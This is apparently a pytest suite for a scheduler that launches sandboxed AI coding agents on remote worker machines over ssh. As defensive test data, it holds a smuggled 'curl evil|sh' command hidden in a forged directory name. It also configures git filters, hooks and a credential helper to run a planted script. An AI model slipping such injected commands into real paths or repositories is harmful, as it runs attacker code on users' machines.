"""Cron jobs on a worker machine: its checkout, prompt, launch line and run, over fake ssh.

The worker is a directory under ``<tmp>/hosts/<ssh target>`` that the fake ssh uses as
HOME; its herdr state lives in the fake herdr's per-label store.
"""

import json
import os
import shutil
import subprocess
import tempfile
import time
import uuid
from pathlib import Path

import claude_accounts
import cron_agents
import machines
import pytest
import remote_probe
import workspace_exit
from cron_jobs import CronJobs
from test_pr_workspaces import local  # noqa: F401 (fixture)

WORKER = {"id": "mini", "label": "Mac mini", "ssh": "mini.test", "os": "darwin"}
URL = "https://github.com/base/repo.git"


def git(*args, cwd):
    return subprocess.check_output(
        ["git", "-c", "user.name=F", "-c", "user.email=f@example.test", "-C", str(cwd), *args],
        text=True,
    ).strip()


@pytest.fixture
def short_tmp(monkeypatch):
    """ssh control sockets need a short directory; never the real /tmp's shared one."""
    path = tempfile.mkdtemp(prefix="bs", dir="/tmp")
    monkeypatch.setattr(tempfile, "tempdir", path)
    machines.control_dir.cache_clear()
    yield Path(path)
    machines.control_dir.cache_clear()
    shutil.rmtree(path)


@pytest.fixture
def host(tmp_path, short_tmp, monkeypatch):
    """A worker's home, its clone of base/repo, and GitHub's copy reachable offline."""
    config = tmp_path / "gitconfig"
    monkeypatch.setenv("GIT_CONFIG_GLOBAL", str(config))
    monkeypatch.setenv("GIT_CONFIG_NOSYSTEM", "1")
    home = tmp_path / "hosts" / "mini.test"
    clone = home / "src" / "repo"
    clone.mkdir(parents=True)
    git("init", "-q", "-b", "main", cwd=clone)
    (clone / "f").write_text("a\n")
    git("add", "f", cwd=clone)
    git("commit", "-q", "-m", "base", cwd=clone)
    github = tmp_path / "github.git"
    git("clone", "-q", "--bare", str(clone), str(github), cwd=tmp_path)
    work = tmp_path / "upstream-work"
    git("clone", "-q", str(github), str(work), cwd=tmp_path)
    git("commit", "-q", "--allow-empty", "-m", "upstream moved on", cwd=work)
    git("push", "-q", "origin", "main", cwd=work)
    config.write_text(
        f'[url "{github}"]\n\tinsteadOf = {URL}\n[protocol "file"]\n\tallow = always\n'
    )
    git("remote", "add", "origin", URL, cwd=clone)
    monkeypatch.setenv("HOME", str(home))
    monkeypatch.delenv("BABYSIT_CLAUDE_TRUST")  # Only ever the fake worker's config here.
    monkeypatch.delenv("CLAUDE_CONFIG_DIR", raising=False)
    monkeypatch.delenv("CODEX_HOME", raising=False)
    (home / ".claude").mkdir()
    (home / ".claude.json").write_text(json.dumps({"projects": {}}))
    upstream = git("rev-parse", "HEAD", cwd=work)
    return home, clone, upstream


def checkout(home, clone, branch="nightly", base="main", **changes):
    args = {
        "clone": str(clone),
        "repo": "base/repo",
        "branch": branch,
        "base": base,
        "directory": str(home / "src" / "worktrees" / "repo" / branch),
        "agent": "claude",
        "account": None,
        "babysit_root": str(home / "src" / "babysit-pr"),
        "sandbox": "safehouse",
        **changes,
    }
    return remote_probe.validate_cron_checkout(remote_probe._host_cron_checkout(**args))


def test_a_workers_job_checkout_starts_from_its_repository_on_github(host):
    home, clone, upstream = host
    found = checkout(home, clone)
    path = Path(found["path"])
    assert path == (home / "src/worktrees/repo/nightly").resolve()
    assert git("symbolic-ref", "--short", "HEAD", cwd=path) == "nightly"
    assert git("rev-parse", "HEAD", cwd=path) == upstream
    assert found["common"] == str((clone / ".git").resolve())
    assert found["home"] == str(home.resolve())
    assert found["claude_home"] == str((home / ".claude").resolve())
    assert found["codex_home"] == str((home / ".codex").resolve())
    # Claude's folder trust dialog would hold up a run nobody watches.
    projects = json.loads((home / ".claude.json").read_text())["projects"]
    assert projects[str(path)]["hasTrustDialogAccepted"] is True
    # The next run uses the same checkout, back on the job's branch.
    git("switch", "-q", "-c", "elsewhere", cwd=path)
    assert checkout(home, clone)["path"] == str(path)
    assert git("symbolic-ref", "--short", "HEAD", cwd=path) == "nightly"


def test_a_workers_checkout_never_runs_what_its_clone_names_or_follows_its_urls(host, tmp_path):
    home, clone, upstream = host
    marker = tmp_path / "ran"
    script = tmp_path / "evil"
    script.write_text(f"#!/bin/sh\necho \"$0 $*\" >> '{marker}'\ncat\n")
    script.chmod(0o700)
    (clone / ".git" / "info" / "attributes").write_text("* filter=x\n")
    for key, value in {
        "filter.x.clean": script,
        "filter.x.smudge": script,
        "core.fsmonitor": script,
        "core.hooksPath": tmp_path,
        "credential.helper": f"!{script}",
        "remote.origin.uploadpack": script,
    }.items():
        git("config", key, str(value), cwd=clone)
    private = tmp_path / "private"
    git("init", "-q", "-b", "main", str(private), cwd=tmp_path)
    git("commit", "-q", "--allow-empty", "-m", "secret", cwd=private)
    secret = git("rev-parse", "HEAD", cwd=private)
    git("config", "remote.origin.url", str(private), cwd=clone)
    git("config", "remote.upstream.url", URL, cwd=clone)
    found = checkout(home, clone)
    assert git("rev-parse", "HEAD", cwd=Path(found["path"])) == upstream
    assert subprocess.run(["git", "-C", str(clone), "cat-file", "-e", secret]).returncode
    assert not marker.exists()
    # A rewrite of the GitHub URL in the clone's own config refuses the fetch.
    git("config", f"url.{private}.insteadOf", URL, cwd=clone)
    with pytest.raises(ValueError, match="redirects a fetch"):
        checkout(home, clone, branch="other")


def test_a_branch_checked_out_in_the_workers_clone_is_refused(host):
    home, clone, _ = host
    with pytest.raises(ValueError, match="checked out in the clone itself"):
        checkout(home, clone, branch="main")
    for change in ({"branch": "-x"}, {"repo": "base/.."}, {"agent": "sh"}, {"account": "../x"}):
        with pytest.raises(ValueError):
            checkout(home, clone, **change)


def test_a_named_claude_account_on_the_worker(host):
    home, clone, _ = host
    with pytest.raises(ValueError, match="Unknown Claude account work"):
        checkout(home, clone, account="work")
    account = home / ".claude" / "accounts" / "work"
    account.mkdir(parents=True)
    (account / ".claude.json").write_text("{}")
    found = checkout(home, clone, account="work")
    assert found["claude_home"] == str(account.resolve())
    assert json.loads((account / ".claude.json").read_text())["projects"][found["path"]] == {
        "hasTrustDialogAccepted": True
    }


def claude_session(home, cwd, sid, *records):
    folder = home / ".claude" / "projects" / "".join(c if c.isalnum() else "-" for c in str(cwd))
    folder.mkdir(parents=True, exist_ok=True)
    path = folder / f"{sid}.jsonl"
    path.write_text("".join(json.dumps(record) + "\n" for record in records))
    return path


def test_the_latest_turn_of_a_workers_transcript(host, tmp_path):
    home, clone, _ = host
    sid = str(uuid.uuid4())
    turn = [
        {"type": "user", "sessionId": sid, "uuid": "u1", "message": {"content": "Do it"}},
        {
            "type": "assistant",
            "sessionId": sid,
            "message": {"content": [{"type": "text", "text": "Done.\nTASK-DONE"}]},
        },
    ]
    path = claude_session(home, clone, sid, *turn)
    found = remote_probe.validate_turn(remote_probe._host_turn(str(path), sid, "claude"))
    assert found == {"turn": "u1", "complete": None}
    with path.open("a") as stream:
        stream.write(json.dumps({"type": "system", "subtype": "turn_duration"}) + "\n")
    found = remote_probe.validate_turn(remote_probe._host_turn(str(path), sid, "claude"))
    assert found == {"turn": "u1", "complete": "Done.\nTASK-DONE"}
    outside = tmp_path / "outside.jsonl"
    outside.write_text(path.read_text())
    with pytest.raises(ValueError, match="Not a session transcript"):
        remote_probe._host_turn(str(outside), sid, "claude")
    with pytest.raises(RuntimeError, match="session ID does not match"):
        remote_probe._host_turn(str(path), str(uuid.uuid4()), "claude")


def test_the_first_turn_and_fingerprint_of_a_workers_transcript(host, tmp_path):
    home, clone, _ = host
    sid, marker = str(uuid.uuid4()), workspace_exit.new_marker()
    turn = [
        {"type": "user", "sessionId": sid, "isMeta": True, "message": {"content": "ctx"}},
        {"type": "user", "sessionId": sid, "uuid": "u1", "message": {"content": f"Go\n{marker}"}},
        {"type": "user", "sessionId": sid, "uuid": "u2", "message": {"content": "More"}},
    ]
    path = claude_session(home, clone, sid, *turn)
    first = remote_probe.validate_first_turn(
        remote_probe._host_first_turn(str(path), "claude", marker)
    )
    assert first == {"turn": "u1", "marked": True}
    other = workspace_exit.new_marker()
    assert remote_probe._host_first_turn(str(path), "claude", other)["marked"] is False
    with pytest.raises(ValueError, match="completion marker"):
        remote_probe._host_first_turn(str(path), "claude", "[babysit-done:x]")
    stat = path.stat()
    found = remote_probe.validate_fingerprint(remote_probe._host_fingerprint(str(path)))
    assert found == {"inode": stat.st_ino, "size": stat.st_size, "mtime_ns": stat.st_mtime_ns}
    outside = tmp_path / "outside.jsonl"
    outside.write_text(path.read_text())
    for op in (
        lambda: remote_probe._host_fingerprint(str(outside)),
        lambda: remote_probe._host_first_turn(str(outside), "claude", marker),
    ):
        with pytest.raises(ValueError, match="Not a session transcript"):
            op()
    for bad in ({"turn": "", "marked": True}, {"turn": "u1", "marked": 1}, {"turn": None}):
        with pytest.raises(ValueError, match="Malformed"):
            remote_probe.validate_first_turn(bad)
    with pytest.raises(ValueError, match="Malformed"):
        remote_probe.validate_fingerprint({**found, "size": -1})


# A job on the worker, run by the dashboard's cron runner ----------------------------


@pytest.fixture
def remote(local, short_tmp, monkeypatch):  # noqa: F811
    """The dashboard's cron runner, and the worker Mac mini with its own clone of base/repo."""
    manager, _, git_local, state, _ = local
    (manager.home / "machines.json").write_text(
        json.dumps({"version": 1, "machines": [{**WORKER, "labels": ["safehouse"]}]})
    )
    host = state.parent / "hosts" / "mini.test"
    clone = host / "src" / "repo"
    subprocess.check_call(["git", "clone", "-q", os.environ["FAKE_HEAD"], str(clone)])
    git("remote", "set-url", "origin", URL, cwd=clone)
    # The fake ssh passes this environment through: its Codex home must be the worker's.
    shutil.copytree(os.environ["CODEX_HOME"], host / ".codex")
    monkeypatch.setenv("CODEX_HOME", str(host / ".codex"))
    monkeypatch.setattr(cron_agents, "REMOTE_WATCH", 0)
    jobs = CronJobs(manager.home, shell=["/bin/sh", "-c"], workspaces=manager)
    yield jobs, manager, git_local, state, host
    jobs.close()


def job_request(manager, **changes):
    return {
        "kind": "agent",
        "name": "Nightly triage",
        "repo": "base/repo",
        "clone": str((manager.src / "repo").resolve()),
        "branch": "nightly",
        "base": "feature",
        "agent": "codex",
        "prompt": "Triage new issues",
        "schedule": {"cron": "0 6 * * *"},
        "timeout": 7200,
        "machine": "mini",
        **changes,
    }


def settled(jobs, statuses=("starting",)):
    deadline = time.monotonic() + 30
    while time.monotonic() < deadline:
        run = jobs.snapshot()["jobs"][0]["runs"][0]
        if run["status"] not in statuses:
            return run
        time.sleep(0.05)
    raise AssertionError("The run did not settle")


def store(state):
    return json.loads(Path(state).read_text())


def test_a_job_on_a_worker_starts_its_agent_there(remote):
    jobs, manager, git_local, state, host = remote
    saved = jobs.save(job_request(manager))
    assert saved["machine"] == "mini" and saved["clone"] == "~/src/repo"
    jobs.run_now(saved["id"])
    run = settled(jobs)
    assert run["status"] == "running", run
    launched = run["agent_run"]
    path = (host / "src/worktrees/repo/nightly").resolve()
    assert launched["path"] == str(path)
    assert (launched["machine"], launched["machine_label"]) == ("mini", "Mac mini")
    assert launched["workspace_id"] == "mini/w1" and launched["url"] is None
    feature = subprocess.check_output(
        ["git", "-C", os.environ["FAKE_HEAD"], "rev-parse", "feature"], text=True
    ).strip()
    assert git("rev-parse", "HEAD", cwd=path) == feature
    data = store(state)
    # Every herdr call went to the worker's server; nothing was opened here.
    assert all(call[0] == "--machine=Mac mini" for call in data["calls"])
    assert not data["workspaces"] and not data["agents"]
    worker = data["machines"]["Mac mini"]
    [opened] = [c for c in worker["calls"] if c[:2] == ["worktree", "open"]]
    assert opened[opened.index("--cwd") + 1] == str((host / "src/repo").resolve())
    assert opened[opened.index("--path") + 1] == str(path)
    [typed] = worker["runs"]
    assert typed[0] == launched["pane"] and typed[1].startswith("codex ")
    [staged] = (host / ".local/state/babysit-pr/cron-prompts").iterdir()
    assert f'"$(cat {staged})"' in typed[1]
    assert staged.read_text() == "Triage new issues\n" + workspace_exit.brief(
        launched["exit_marker"]
    )
    [agent] = worker["agents"]
    assert agent["pane_id"] == launched["pane"] and agent["cwd"] == str(path)
    # The worker's agent keeps the job busy, as a local one does.
    jobs.tick()
    with pytest.raises(ValueError, match="already running"):
        jobs.run_now(saved["id"])


def watched(jobs):
    """One watch pass, waiting for its looks at worker runs, which run in the background."""
    jobs.watch()
    deadline = time.monotonic() + 30
    while time.monotonic() < deadline:
        with jobs.lock:
            if not jobs.remote_looks:
                return
        time.sleep(0.02)
    raise AssertionError("The look at the worker's run did not finish")


def rollout(host, cwd, sid, *events):
    day = host / ".codex" / "sessions" / "2026" / "10" / "25"
    day.mkdir(parents=True, exist_ok=True)
    path = day / f"rollout-2026-10-25T10-00-00-{sid}.jsonl"
    records = [{"type": "session_meta", "payload": {"id": sid, "cwd": str(cwd)}}, *events]
    path.write_text("".join(json.dumps(record) + "\n" for record in records))
    return path


EMPTY = "› \x1b[2mAsk Codex to do anything\x1b[0m"


def idle_agent(state, path, screen):
    """The worker's agent at rest in its pane, with its shell and process there."""
    data = store(state)
    mini = data["machines"]["Mac mini"]
    [agent] = mini["agents"]
    agent["agent_status"] = "idle"
    mini.setdefault("process_info", {})[agent["pane_id"]] = {
        "shell_pid": 100,
        "foreground_processes": [
            {"pid": 100},
            {"pid": 4242, "argv0": "codex", "argv": agent["argv"], "cwd": str(path)},
        ],
    }
    mini.setdefault("screens", {})[agent["pane_id"]] = [screen]
    Path(state).write_text(json.dumps(data))


def test_a_workers_run_keeps_the_agents_answer_and_exits_it_once_it_confirms(remote, monkeypatch):
    jobs, manager, _, state, host = remote
    monkeypatch.setattr(workspace_exit, "SETTLE_SECONDS", 0)
    saved = jobs.save(job_request(manager))
    jobs.run_now(saved["id"])
    run = settled(jobs)
    launched = run["agent_run"]
    marker = launched["exit_marker"]
    idle_agent(state, launched["path"], f"Triaged 3 issues.\n{marker}\n{EMPTY}")
    sid = str(uuid.uuid4())
    started = [
        {"type": "event_msg", "payload": {"type": "user_message", "message": f"Triage\n{marker}"}},
        {"type": "event_msg", "payload": {"type": "task_started", "turn_id": "t1"}},
    ]
    path = rollout(host, launched["path"], sid, *started)
    watched(jobs)
    run = jobs.snapshot()["jobs"][0]["runs"][0]
    assert run["status"] == "running" and run["message"] == "The agent is working"
    done = {
        "type": "event_msg",
        "payload": {
            "type": "task_complete",
            "turn_id": "t1",
            "last_agent_message": f"Triaged 3 issues.\n{marker}",
        },
    }
    with path.open("a") as stream:
        stream.write(json.dumps(done) + "\n")
    watched(jobs)  # Finished: exited once it stays idle.
    watched(jobs)
    run = jobs.snapshot()["jobs"][0]["runs"][0]
    assert run["status"] == "succeeded", run["message"]
    assert run["message"] == "The agent finished and exited"
    assert "Triaged 3 issues." in jobs.log(run["id"])["text"]
    assert marker not in jobs.log(run["id"])["text"]
    worker = store(state)["machines"]["Mac mini"]
    assert ["agent", "send-keys", launched["pane"], "ctrl+d"] in worker["calls"]
    assert ["pane", "close", launched["pane"]] in worker["calls"]
    # Every herdr call went to the worker's server.
    assert all(call[0] == "--machine=Mac mini" for call in store(state)["calls"])
    # The next run is no longer skipped behind an agent left open.
    jobs.run_now(saved["id"])
    assert settled(jobs)["status"] == "running"


def test_a_workers_agent_that_leaves_without_confirming_needs_attention(remote):
    jobs, manager, _, state, host = remote
    saved = jobs.save(job_request(manager))
    jobs.run_now(saved["id"])
    settled(jobs)
    data = store(state)
    data["machines"]["Mac mini"]["agents"] = []
    Path(state).write_text(json.dumps(data))
    watched(jobs)
    run = jobs.snapshot()["jobs"][0]["runs"][0]
    assert run["status"] == "attention" and "Could not identify the agent" in run["message"]


@pytest.mark.parametrize(
    ("changes", "message"),
    [
        ({"machine": "box"}, "Unknown machine box"),
        ({"unsandboxed": True}, "always run in their sandbox"),
        ({"machine": 3}, "Choose a machine"),
    ],
)
def test_jobs_a_worker_cannot_run_are_refused(remote, changes, message):
    jobs, manager, *_ = remote
    with pytest.raises(ValueError, match=message):
        jobs.save(job_request(manager, **changes))


def test_shell_jobs_and_disabled_workers_stay_off_workers(remote):
    jobs, manager, *_ = remote
    with pytest.raises(ValueError, match="Only agent jobs"):
        jobs.save({"name": "x", "command": "true", "schedule": {"every": 60}, "machine": "mini"})
    (manager.home / "machines.json").write_text(
        json.dumps({"version": 1, "machines": [{**WORKER, "enabled": False}]})
    )
    with pytest.raises(ValueError, match="disabled"):
        jobs.save(job_request(manager))


def test_auto_is_resolved_once_at_save(remote):
    jobs, manager, *_ = remote
    saved = jobs.save(job_request(manager, machine="auto"))
    # Auto never picks a worker yet: the job is pinned here.
    assert saved["machine"] is None and saved["clone"] == str((manager.src / "repo").resolve())
    local_job = jobs.save(job_request(manager, name="Here", branch="here", machine="local"))
    assert local_job["machine"] is None


def test_a_linux_workers_launch_line_runs_its_babysit_bwrap():
    worker = machines.Machine(
        "box", "Box", "box", "linux", "~/src", "~/b", "python3", 4, ("bwrap", "gpg"), None, True
    )
    found = {
        "path": "/home/b/src/worktrees/repo/n",
        "common": "/home/b/src/repo/.git",
        "home": "/home/b",
        "clone": "/home/b/src/repo",
        "claude_home": "/home/b/.claude/accounts/work",
        "claude_env": "/home/b/.claude/accounts/work",
        "codex_home": "/home/b/.codex",
        "launcher": "/home/b/b/scripts/babysit-bwrap",
    }
    job = {
        "agent": "claude",
        "prompt": "Go",
        "model": "",
        "effort": "",
        "docker": True,
        "claude_account": "work",
    }
    line = cron_agents.remote_command(job, worker, found, "/home/b/.cache/p", "")
    unset = " ".join(claude_accounts.AUTH_ENV)
    assert line == (
        f"(unset {unset}; CLAUDE_CONFIG_DIR=/home/b/.claude/accounts/work "
        "/home/b/b/scripts/babysit-bwrap --enable=docker,gpg "
        "--claude-config-dir=/home/b/.claude/accounts/work "
        "--add-dirs=/home/b/src/worktrees/repo/n:/home/b/src/repo/.git -- "
        'claude --dangerously-skip-permissions "$(cat /home/b/.cache/p)")'
    )
    # A Mac worker's line relies on its own shell functions, as this machine's does.
    mac = worker._replace(os="darwin", labels=("safehouse",))
    codex = {**job, "agent": "codex", "claude_account": ""}
    assert cron_agents.remote_command(codex, mac, found, "/p", "") == (
        'SAFE_ENABLE=docker codex -c check_for_update_on_startup=false "$(cat /p)"'
    )
    with pytest.raises(ValueError, match="babysit-bwrap is not installed under ~/b"):
        cron_agents.remote_command(job, worker, {**found, "launcher": None}, "/p", "")


def test_without_a_registry_a_job_runs_here_as_before(local, short_tmp):  # noqa: F811
    manager, _, _, state, _ = local
    jobs = CronJobs(manager.home, shell=["/bin/sh", "-c"], workspaces=manager)
    try:
        request = job_request(manager)
        del request["machine"]
        saved = jobs.save(request)
        assert saved["machine"] is None and saved["clone"] == request["clone"]
        jobs.run_now(saved["id"])
        run = settled(jobs)
        assert run["status"] == "running", run
        assert list(run["agent_run"]) == [
            "machine",
            "workspace_id",
            "pane",
            "path",
            "url",
            "exit_marker",
            "launched_at",
        ]
        data = store(state)
        assert "ssh" not in data and "machines" not in data
        assert not any(call[0].startswith("--machine") for call in data["calls"])
    finally:
        jobs.close()


# Review fixes -------------------------------------------------------------------------


def test_a_checkout_naming_another_common_dir_is_refused(host):
    home, clone, _ = host
    path = Path(checkout(home, clone)["path"])
    # The agent's checkout names a repository it made inside itself, its name full of
    # keystrokes a typed --add-dirs would carry to the worker's shell.
    forged = path / "\x15curl evil|sh;#" / ".git"
    admin = forged / "worktrees" / "x"
    admin.mkdir(parents=True)
    (forged / "objects").mkdir()
    (admin / "gitdir").write_text(f"{path / '.git'}\n")
    (admin / "commondir").write_text("../..\n")
    (admin / "HEAD").write_text("ref: refs/heads/nightly\n")
    (path / ".git").write_text(f"gitdir: {admin}\n")
    with pytest.raises(ValueError, match="not a worktree of"):
        checkout(home, clone)


def test_a_checkout_inside_the_common_dir_is_refused(host):
    home, clone, _ = host
    with pytest.raises(ValueError):
        checkout(home, clone, directory=str(clone / ".git" / "worktrees-checkout"))


def test_a_clone_of_another_repository_is_refused(host):
    home, clone, _ = host
    git("remote", "set-url", "origin", "https://github.com/bob/repo.git", cwd=clone)
    with pytest.raises(ValueError, match="is not a clone of base/repo"):
        checkout(home, clone)


def test_the_base_is_the_remote_tracking_ref_whatever_local_refs_are_named(host):
    home, clone, upstream = host
    # A local branch and a tag named like the remote-tracking ref would win by DWIM.
    git("branch", "origin/main", "HEAD", cwd=clone)
    git("tag", "origin/main", "HEAD", cwd=clone)
    found = checkout(home, clone)
    assert git("rev-parse", "HEAD", cwd=Path(found["path"])) == upstream


@pytest.mark.parametrize("bad", ["\x15", "\x1b[201~", "\t", "\x9b", "\x7f"])
def test_worker_paths_with_control_characters_are_refused(bad):
    found = {
        "path": "/home/u/src/worktrees/r/b",
        "clone": "/home/u/src/r",
        "common": "/home/u/src/r/.git",
        "home": "/home/u",
        "claude_home": None,
        "claude_env": None,
        "codex_home": "/home/u/.codex",
        "launcher": None,
    }
    remote_probe.validate_cron_checkout(found)
    for key in found:
        with pytest.raises(ValueError, match="Malformed probe answer"):
            remote_probe.validate_cron_checkout({**found, key: f"/home/u/{bad}x"})


@pytest.mark.parametrize("bad", ["\x15", "\x1b[201~", "\n", "\x9b"])
def test_typed_lines_never_carry_control_characters(bad):
    import sandbox
    import wt

    grants = sandbox.Grants()
    with pytest.raises(ValueError, match="control character"):
        sandbox.typed_line(["claude", f"a{bad}"], grants, str, "--x", "safehouse")
    with pytest.raises(ValueError, match="control character"):
        sandbox.typed_line(
            ["claude"], grants, str, "--x", "bwrap", launcher="/b", confined=[f"--a={bad}"]
        )
    with pytest.raises(ValueError, match="control character"):
        wt.agent_command("claude", "Go", stage=lambda _: f"/p{bad}")
    # Ordinary input is typed exactly as before.
    assert wt.agent_command("codex", "Go", stage=lambda _: "/p") == (
        'codex -c check_for_update_on_startup=false "$(cat /p)"'
    )


def test_bwrap_trusts_the_config_its_sandboxed_claude_reads(host):
    home, clone, _ = host
    (home / ".claude" / ".claude.json").write_text(json.dumps({"projects": {}}))
    found = checkout(home, clone, sandbox="bwrap")
    # babysit-bwrap sets CLAUDE_CONFIG_DIR, so even the default login reads its own copy.
    inner = json.loads((home / ".claude" / ".claude.json").read_text())["projects"]
    assert inner[found["path"]] == {"hasTrustDialogAccepted": True}
    assert found["claude_env"] == str(home / ".claude")
    # On a Mac worker the default login keeps ~/.claude.json and no CLAUDE_CONFIG_DIR.
    found = checkout(home, clone, branch="other")
    assert found["claude_env"] is None
    outer = json.loads((home / ".claude.json").read_text())["projects"]
    assert outer[found["path"]] == {"hasTrustDialogAccepted": True}


def test_a_named_account_keeps_its_literal_path_for_claude(host, tmp_path):
    home, clone, _ = host
    elsewhere = tmp_path / "work-login"
    elsewhere.mkdir()
    (elsewhere / ".claude.json").write_text("{}")
    (home / ".claude" / "accounts").mkdir()
    (home / ".claude" / "accounts" / "work").symlink_to(elsewhere)
    found = checkout(home, clone, account="work")
    # Claude names its Keychain item after the path it is given, not where it leads.
    assert found["claude_env"] == str(home / ".claude" / "accounts" / "work")
    assert found["claude_home"] == str(elsewhere.resolve())


def test_the_latest_turn_is_read_from_a_transcripts_end(host, monkeypatch):
    home, clone, _ = host
    monkeypatch.setattr(remote_probe, "MAX_SCAN", 4096)
    sid = str(uuid.uuid4())
    day = home / ".codex" / "sessions" / "2026" / "10" / "25"
    day.mkdir(parents=True)
    path = day / f"rollout-2026-10-25T10-00-00-{sid}.jsonl"
    filler = {"type": "event_msg", "payload": {"type": "token_count", "pad": "x" * 200}}
    records = [
        {"type": "session_meta", "payload": {"id": sid, "cwd": str(clone)}},
        *[filler] * 100,
        {"type": "event_msg", "payload": {"type": "task_started", "turn_id": "t9"}},
        {
            "type": "event_msg",
            "payload": {"type": "task_complete", "turn_id": "t9", "last_agent_message": "Done"},
        },
    ]
    path.write_text("".join(json.dumps(record) + "\n" for record in records))
    assert path.stat().st_size > 4 * 4096
    found = remote_probe.validate_turn(remote_probe._host_turn(str(path), sid, "codex"))
    assert found == {"turn": "t9", "complete": "Done"}


def test_prompts_are_staged_only_in_a_private_folder(tmp_path, fake_tools, short_tmp):
    (short_tmp / "home").mkdir()
    (short_tmp / "home" / "machines.json").write_text(
        json.dumps({"version": 1, "machines": [WORKER]})
    )
    worker = machines.resolve(short_tmp / "home", "mini")
    host = tmp_path / "hosts" / "mini.test"
    folder = host / ".local" / "state" / "babysit-pr"
    folder.mkdir(parents=True)
    elsewhere = tmp_path / "elsewhere"
    elsewhere.mkdir()
    (folder / "cron-prompts").symlink_to(elsewhere)
    target = machines.remote_path(cron_agents.REMOTE_PROMPTS)
    assert cron_agents.REMOTE_PROMPTS == "~/.local/state/babysit-pr/cron-prompts"
    with pytest.raises(ValueError, match="Could not stage"):
        machines.put_file(short_tmp / "home", worker, target, "a", b"x", keep=60)
    assert not list(elsewhere.iterdir())
    (folder / "cron-prompts").unlink()
    (folder / "cron-prompts").mkdir()
    (folder / "cron-prompts").chmod(0o777)
    with pytest.raises(ValueError, match="Could not stage"):
        machines.put_file(short_tmp / "home", worker, target, "a", b"x", keep=60)
    (folder / "cron-prompts").chmod(0o700)
    assert machines.put_file(short_tmp / "home", worker, target, "a", b"x").endswith("/a")


def test_a_staged_path_with_control_characters_is_refused(monkeypatch, short_tmp):
    worker = machines.Machine(
        "mini", "Mac mini", "mini", "darwin", "~/src", "~/b", "python3", 4, (), None, True
    )

    def answer(home, m, argv, **kwargs):
        return subprocess.CompletedProcess(argv, 0, b"/home/u/\x15x/a", b"")

    monkeypatch.setattr(machines, "run", answer)
    with pytest.raises(ValueError, match="Could not stage"):
        machines.put_file(short_tmp, worker, machines.remote_path("~/p"), "a", b"x")


def test_a_hung_worker_never_holds_up_the_scheduler(remote, monkeypatch):
    import threading

    jobs, manager, _, _, _ = remote
    saved = jobs.save(job_request(manager))
    jobs.run_now(saved["id"])
    settled(jobs)
    release = threading.Event()
    calls = []

    def hung(record, *args):
        calls.append(record)
        release.wait(20)
        return {**record, "message": "Still"}

    monkeypatch.setattr(workspace_exit, "step", hung)
    try:
        started = time.monotonic()
        jobs.watch()
        jobs.watch()  # A second pass never stacks another look at the same run.
        assert time.monotonic() - started < 2
        deadline = time.monotonic() + 5
        while not calls and time.monotonic() < deadline:
            time.sleep(0.02)
        assert len(calls) == 1
    finally:
        release.set()


def test_a_codex_job_on_a_worker_names_no_claude_account(remote):
    jobs, manager, *_ = remote
    with pytest.raises(ValueError, match="only be selected for Claude"):
        jobs.save(job_request(manager, claude_account="work"))
